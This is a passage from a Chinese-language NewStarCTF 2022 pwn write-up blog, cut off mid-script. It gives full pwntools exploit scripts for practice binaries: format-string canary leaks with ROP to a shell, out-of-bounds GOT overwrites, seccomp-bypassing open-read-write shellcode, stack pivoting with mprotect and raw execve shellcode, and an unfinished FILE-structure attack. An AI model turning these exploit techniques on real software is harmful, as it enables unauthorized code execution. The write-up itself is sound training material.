id="canary">canary</h3><p>保护全开</p><p>存在两个格式化字符串漏洞</p><p><img src="/2022/11/16/newstarctf2022/2.png" alt="2"></p><p>backdoor里有system，bss段有/bin/sh</p><p><img src="/2022/11/16/newstarctf2022/3.png" alt="3"></p><p>思路是泄露canary，改money长度造成溢出，rop出 system(/bin/sh)</p><p>偏移为6</p><p><img src="/2022/11/16/newstarctf2022/4.png" alt="4"></p><p>gdb调试可看到canary偏移为11</p><p><img src="/2022/11/16/newstarctf2022/5.png" alt="5"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25326</span> )<br>    libc = ELF(remote_libc)<br><span class="hljs-keyword">else</span>:<br>    r = gdb.debug(local_file)<br>    libc = ELF(local_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;pid&quot;</span>+<span class="hljs-built_in">str</span>(proc.pidof(r)))<br><span class="hljs-comment">#------------------------</span><br>offest=<span class="hljs-number">6</span><br>sla(<span class="hljs-string">&#x27;Now answer me, will you v me 50\n&#x27;</span>,<span class="hljs-string">&#x27;aaaaaaa,%11$p,%17$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&#x27;canary&#x27;</span>,canary)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>true_main=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>pie_base=true_main-<span class="hljs-number">0x9e4</span><br>money=<span class="hljs-number">0x20206C</span><br>true_money=money+pie_base<br>info(<span class="hljs-string">&#x27;true_money&#x27;</span>,true_money)<br><span class="hljs-comment">#pause()</span><br>sla(<span class="hljs-string">&#x27;What do you want to say to the canary\n&#x27;</span>,<span class="hljs-string">&#x27;%200c%8$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(true_money))<br>pop_rdi=<span class="hljs-number">0xb33</span>+pie_base<br>binsh=<span class="hljs-number">0x202020</span>+pie_base<br>system=<span class="hljs-number">0x9DC</span>+pie_base<br>sl(flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>,canary,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>,pop_rdi,binsh,system))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="这是堆🐴">这是堆🐴</h3><p>下标可以小于0，bss段有个指针指向自己(貌似还有个off by null)，Edit功能用负数配合该指针达成任意写</p><p>show功能泄露libc后，改atoi为system，填入binsh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sea(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sea(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------</span><br>you_found_me=<span class="hljs-number">0x602080</span><br><span class="hljs-comment">#debug()</span><br>edit(-<span class="hljs-number">12</span>,flat(you_found_me,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>show(-<span class="hljs-number">11</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>))-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>atoi_plt=<span class="hljs-number">0x602058</span><br>edit(-<span class="hljs-number">12</span>,flat(atoi_plt))<br><span class="hljs-comment">#print(p64(system)[0:6])</span><br>edit(-<span class="hljs-number">12</span>,p64(system)[<span class="hljs-number">0</span>:<span class="hljs-number">7</span>])<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="OhMyShellcode">OhMyShellcode</h3><p>呃呃呃，只检测到0x19,只要syscall在0x19长度后即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#--------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rsi,0x23301e</span><br><span class="hljs-string">    mov rdx,0x800</span><br><span class="hljs-string">    mov rax,0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode)))<br>sea(<span class="hljs-string">&#x27;Show me your magic.\n&#x27;</span>,shellcode)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Good luck!&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(<span class="hljs-number">0x233000</span>))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br>se(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu2">ret2csu2</h3><p>栈迁移到bss段,然后mprotect提权bss段,紧接着执行shellcode即可</p><p>(mprotect的地址要0x1000的倍数，不然无法提权，总的来说这题gdb调试格外重要)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601020</span>+<span class="hljs-number">0x300</span><br>main_read=<span class="hljs-number">0x4006D6</span><br>leave_ret=<span class="hljs-number">0x0000000000400681</span> <span class="hljs-comment"># leave ; ret</span><br>main=<span class="hljs-number">0x400683</span><br>shellcode=<span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span><br>mprotect=elf.got[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>,bss+<span class="hljs-number">0xf0</span>,main_read)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;Also a fun function in this elf.Remember to check it!\n&#x27;</span>,payload)<br>payload1=csu(<span class="hljs-number">0x601000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,mprotect)+p64(<span class="hljs-number">0x6013a0</span>)+shellcode<br>payload1=payload1.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(payload1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="这是堆🐎">这是堆🐎</h3><p>这题有难度的</p><p>还开了沙盒，禁用了execve和open</p><p>漏洞依旧存在于Edit 下标小于0没检测，可以数组越界打stdout泄露libc</p><p>因为打印出来的地址太多，变数太多，7f开头的可能是栈地址，libc段的地址，凑巧7f字符等情况</p><p>所以我找了几个可能是libc段的地址，加大概率，如果不是这些地址的话就会报错libc_base undined</p><p>多试几次</p><p>找不到题解，提示的劫持puts不会，自己有另一种思路：</p><p>数组越界打stdout泄露libc</p><p>继续数组越界打stderr，exit来触发IO流，用的是house of apple2的利用链</p><p>(不过这个方法不太好，还得小心翼翼不破坏stdout，破坏掉了调用puts就报错)</p><p>exit并没有调用指定链，不知为啥</p><p>最后虽然失败了，但还是记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#fail exp</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Any data?\n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Content:&#x27;</span>,content)<br><span class="hljs-comment">#------------------------</span><br>edit(-<span class="hljs-number">8</span>,flat(<span class="hljs-number">0xfbad1800</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>rc(<span class="hljs-number">0x648</span>)<br>rc(<span class="hljs-number">0x1000</span>)<br>libc_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-keyword">if</span> (libc_addr-<span class="hljs-number">0x1ed4a0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ed4a0</span> <span class="hljs-comment">#_nl_global_locale</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x1ee7f0</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x1ee7f0</span> <span class="hljs-comment">#_IO_stdfile_0_lock</span><br><span class="hljs-keyword">elif</span> (libc_addr-<span class="hljs-number">0x8ff50</span>)&amp;<span class="hljs-number">0xfff</span>==<span class="hljs-number">0x000</span> :<br>    libc_base=libc_addr-<span class="hljs-number">0x8ff50</span> <span class="hljs-comment">#_IO_new_file_finish</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-comment">#debug()</span><br><br>fake_IO_FILE =<span class="hljs-string">b&#x27;  sh&#x27;</span><br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr + <span class="hljs-number">0x50</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)<br>fake_IO_FILE +=p64(<span class="hljs-number">0xfbad1800</span>)+p64(stderr+<span class="hljs-number">0x163</span>)*<span class="hljs-number">5</span>+p64(stderr+<span class="hljs-number">0x164</span>)+p64(stderr+<span class="hljs-number">0x163</span>) +p64(stderr+<span class="hljs-number">0x164</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stderr +<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe8</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stderr-<span class="hljs-number">0xc40</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0x0000000043000000</span>)+p64(stderr+<span class="hljs-number">0x1220</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0</span>)+p64(stderr-<span class="hljs-number">0xd40</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span 